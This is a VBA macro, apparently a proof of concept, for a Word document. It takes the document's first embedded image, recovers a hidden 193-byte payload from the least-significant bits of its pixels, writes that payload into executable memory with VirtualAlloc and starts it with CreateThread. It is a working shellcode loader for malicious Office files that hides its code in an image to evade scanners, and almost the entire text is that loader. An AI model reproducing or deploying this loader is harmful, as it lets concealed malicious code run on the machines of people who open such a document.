'I am slowly loosing my mental health here

Private Declare Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Integer) As Long

Private Declare Function OpenClipboard Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetClipboardData Lib "user32" (ByVal wFormat As Integer) As Long
Private Declare Function CloseClipboard Lib "user32" () As Long
Private Declare Function CopyImage Lib "user32" (ByVal handle As Long, ByVal un1 As Long, ByVal n1 As Long, ByVal n2 As Long, ByVal un2 As Long) As Long

Private Declare Function GetObjectA Lib "Gdi32" (ByVal handle As Long, ByVal c As Long, ByRef pv As BITMAP86) As Long

Private Declare Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As Long)
Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long


Public Type BITMAP
 bmType As Long
 bmWidth As Long
 bmHeight As Long
 bmWidthBytes As Long
 bmPlanes As Integer
 bmBitsPixel As Integer
 bmBits As Long
End Type

Const CF_BITMAP = 2
Const IMAGE_BITMAP = 0
Const LR_COPYRETURNORG = &H4
Const LR_CREATEDIBSECTION = &H2000

Const MEM_RESERVE = &H2000
Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40


Private Function GetLsb(ByVal Target As Byte, ByVal Source As Byte) As Byte
    GetLsb = (Target * 2) Or (Source And 1)
End Function

Private Function Read(Bmp As BITMAP, lPayloadSize As Long) As Byte()
    Dim lRowLength As Long, bBmBitsArr() As Byte
    'Bitmap contained in clipboard is actually 32bit RGBA
    'No padding required at the end of the row
    lRowLength = Bmp.bmWidth * 4
    lBmBitsSize = (lRowLength) * (Bmp.bmHeight)
    ReDim bBmBitsArr(lBmBitsSize)

    RtlMoveMemory VarPtr(bBmBitsArr(0)), Bmp.bmBits, lBmBitsSize

    Dim lBitLength As Long, bPayloadArr() As Byte
    lBitLength = lPayloadSize * 8
    ReDim bPayloadArr(lPayloadSize)

    Dim x As Long, y As Long, lXOffset As Long, lYOffset As Long, lBitPos As Long, lBytePos As Long
    iPos = 0
    
    Dim bChannelsArr(2) As Byte
    Dim k As Long

    lYOffset = (lRowLength) * (Bmp.bmHeight - 1)
    For y = 0 To Bmp.bmHeight - 1
        For x = 0 To Bmp.bmWidth - 1
            lXOffset = x * 4
            
            bChannelsArr(2) = bBmBitsArr(lYOffset + lXOffset)
            bChannelsArr(1) = bBmBitsArr(lYOffset + lXOffset + 1)
            bChannelsArr(0) = bBmBitsArr(lYOffset + lXOffset + 2)
            
            For k = 0 To 2
                lBytePos = Int(lBitPos / 8)
                If lBitLength <= 0 Then
                    bPayloadArr(lBytePos) = 0
                    
                    Read = bPayloadArr
                    Exit Function
                End If
                
                bPayloadArr(lBytePos) = GetLsb(bPayloadArr(lBytePos), bChannelsArr(k))
                lBitPos = lBitPos + 1
                lBitLength = lBitLength - 1
            Next k
        Next x
        lYOffset = lYOffset - lRowLength
    Next y
End Function

Private Sub Run(ByVal lPayloadAddr As Long, ByVal lPayloadSize As Long)
    Dim lpMemPtr As Long, lResult As Long
    lpMemPtr = VirtualAlloc(0&, lPayloadSize, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
    RtlMoveMemory lpMemPtr, lPayloadAddr, lPayloadSize
    lResult = CreateThread(0&, 0&, lpMemPtr, 0&, 0&, 0&)
End Sub

Private Sub poc()
    ActiveDocument.InlineShapes(1).Range.CopyAsPicture

    Dim lAvailable As Long, lResult As Long
    lAvailable = IsClipboardFormatAvailable(CF_BITMAP)

    If lAvailable <> 0 Then
        Dim hKeyboard As Long, hPtr As Long, hBitmap As Long, Bmp As BITMAP
        
        hKeyboard = OpenClipboard(0&)
        hPtr = GetClipboardData(CF_BITMAP)
        hBitmap = CopyImage(hPtr, IMAGE_BITMAP, 0, 0, LR_COPYRETURNORG Or LR_CREATEDIBSECTION)
        hKeyboard = CloseClipboard

        Dim lBmBitsSize As Long
        lResult = GetObjectA(hBitmap, Len(Bmp), Bmp)

        
        Dim lPayloadSize As Long
        lPayloadSize = 193
        
        bPayloadArr = Read(Bmp, lPayloadSize)

        Run VarPtr(bPayloadArr(0)), lPayloadSize  
    End If
End Sub
